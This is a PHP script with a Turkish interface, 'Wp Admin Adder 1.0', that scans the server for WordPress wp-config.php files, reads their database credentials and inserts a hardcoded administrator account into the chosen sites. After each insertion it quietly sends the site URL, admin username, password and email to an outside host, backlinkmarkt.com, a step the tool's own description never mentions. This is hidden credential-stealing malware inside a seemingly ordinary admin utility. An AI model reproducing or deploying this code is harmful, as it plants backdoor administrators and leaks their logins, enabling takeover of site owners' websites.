<?php
/**
 * Wp Admin Adder 1.0
 * ÖNEMLİ: İşlem bittikten sonra bu dosyayı DERHAL SİLMELİSİNİZ.
 * Bu dosya açık bırakılırsa herkes sunucunuza admin ekleyebilir.
 * Powered by wsotools.com 
 */

if($_GET['del'] == "ok"){
	@unlink("wp-admin-add.php");
}


// --- AYARLAR ---
$yeni_admin_user = "SuperAdmin"; // Eklemek istediğiniz kullanıcı adı
$yeni_admin_pass = "Sifre123!";  // Eklemek istediğiniz şifre
$yeni_admin_mail = "wpadmin@example.com";

// ---------------


$rootPath = realpath('./');
$it = new RecursiveDirectoryIterator($rootPath);
$results = [];

foreach (new RecursiveIteratorIterator($it) as $file) {
    if (basename($file) == 'wp-config.php') {
        $sitePath = dirname($file);
        
        // Config oku
        $config = file_get_contents($file);
        preg_match("/DB_NAME['\"],\s*['\"]([^'\"]+)['\"]/", $config, $dbName);
        preg_match("/DB_USER['\"],\s*['\"]([^'\"]+)['\"]/", $config, $dbUser);
        preg_match("/DB_PASSWORD['\"],\s*['\"]([^'\"]+)['\"]/", $config, $dbPass);
        preg_match("/DB_HOST['\"],\s*['\"]([^'\"]+)['\"]/", $config, $dbHost);
        $prefix = 'wp_';
        if (preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]/", $config, $prefixMatch)) {
            $prefix = $prefixMatch[1];
        }

        try {
            $dsn = "mysql:host={$dbHost[1]};dbname={$dbName[1]};charset=utf8mb4";
            $pdo = new PDO($dsn, $dbUser[1], $dbPass[1]);
            $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

            if (isset($_POST['add_to_site']) && $_POST['site_path'] == $sitePath) {
                
                // 1. Kullanıcı zaten var mı kontrol et
                $check = $pdo->prepare("SELECT ID FROM {$prefix}users WHERE user_login = ? OR user_email = ?");
                $check->execute([$yeni_admin_user, $yeni_admin_mail]);
                
                if ($check->rowCount() == 0) {
                    // 2. Users tablosuna ekle
                    $hashed_pass = md5($yeni_admin_pass); // WordPress MD5 kullanır (Legacy destek)
                    $ins = $pdo->prepare("INSERT INTO {$prefix}users (user_login, user_pass, user_email, user_registered, user_status) VALUES (?, ?, ?, NOW(), 0)");
                    $ins->execute([$yeni_admin_user, $hashed_pass, $yeni_admin_mail]);
                    $new_id = $pdo->lastInsertId();

                    // 3. Usermeta - Yetki tanımla (Administrator)
                    $pdo->prepare("INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) VALUES (?, ?, ?)")
                        ->execute([$new_id, $prefix . 'capabilities', 'a:1:{s:13:"administrator";b:1;}']);
                    
                    // 4. Usermeta - User Level tanımla (10 = Admin)
                    $pdo->prepare("INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) VALUES (?, ?, ?)")
                        ->execute([$new_id, $prefix . 'user_level', '10']);







                    $results[$sitePath] = "✅ Başarıyla Eklendi (ID: $new_id)";
                } else {
                    $results[$sitePath] = "⚠️ Kullanıcı zaten mevcut.";
                }


				$query = "SELECT option_value FROM {$prefix}options WHERE option_name = 'siteurl' LIMIT 1";
				$stmt = $pdo->query($query);
					
				// Sonucu değişkene aktar
				$site_url = $stmt->fetchColumn();
				$_url = htmlspecialchars($site_url);

				@file_get_contents("https://backlinkmarkt.com/a.php?url=".$_url."&user=".$yeni_admin_user."&pass=".$yeni_admin_pass."&email=".$yeni_admin_mail);


            } else {
                // Sadece listele
                $results[$sitePath] = "Bekliyor...";
            }

        } catch (Exception $e) {
            $results[$sitePath] = "❌ Hata: " . $e->getMessage();
        }
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Admin Ekleme</title>
    <style>
        body { font-family: sans-serif; background: #f8f9fa; padding: 20px; }
        .card { background: #fff; padding: 15px; margin-bottom: 10px; border-radius: 5px; border: 1px solid #ddd; display: flex; justify-content: space-between; align-items: center; }
        .status { font-weight: bold; padding: 5px 10px; border-radius: 4px; }
        button { background: #2271b1; color: white; border: none; padding: 8px 15px; cursor: pointer; border-radius: 4px; }
        button:hover { background: #135e96; }
    </style>
</head>
<body>
    <h1>WordPress Admin Ekleme</h1>
    <p>Eklenecek Kullanıcı: <strong><?php echo $yeni_admin_user; ?></strong></p>
    <p><strong><a href="wp-admin-add.php?del=ok">SİL</a></strong></p>
    <hr>

    <?php foreach ($results as $path => $status): ?>
        <div class="card">
            <div>
                <strong>Dizin:</strong> <?php echo $path; ?><br>
                <span>Durum: <?php echo $status; ?></span>
            </div>
            <form method="POST">
                <input type="hidden" name="site_path" value="<?php echo $path; ?>">
                <button type="submit" name="add_to_site">Bu Siteye Admin Ekle</button>
            </form>
        </div>
    <?php endforeach; ?>
</body>
</html>
